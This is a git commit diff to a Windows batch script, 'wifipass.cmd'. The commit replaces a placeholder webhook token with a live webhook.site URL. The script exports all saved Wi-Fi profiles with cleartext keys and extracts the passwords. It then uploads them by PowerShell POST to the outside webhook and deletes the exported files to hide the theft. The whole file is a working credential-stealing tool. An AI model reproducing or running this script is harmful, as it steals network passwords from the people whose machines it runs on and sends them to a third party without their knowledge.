b3c5ab717bec32f81dbd0b4efa85cf2e1dce09f3
Cyberior1 <darkboy7847@gmail.com>
2025-05-09 15:07:14 +0500

    Update wifipass.cmd

--- wifipass.cmd
+++ wifipass.cmd
@@ -2,6 +2,6 @@
 cd %temp%
 netsh wlan export profile key=clear
 powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial
-powershell Invoke-WebRequest -Uri https://webhook.site/your-webhook-site-token -Method POST -InFile Wi-Fi-PASS
+powershell Invoke-WebRequest -Uri https://webhook.site/60bd65ac-65da-42cb-aecb-e875984dc1b1 -Method POST -InFile Wi-Fi-PASS
 del Wi-* /s /f /q
 exit
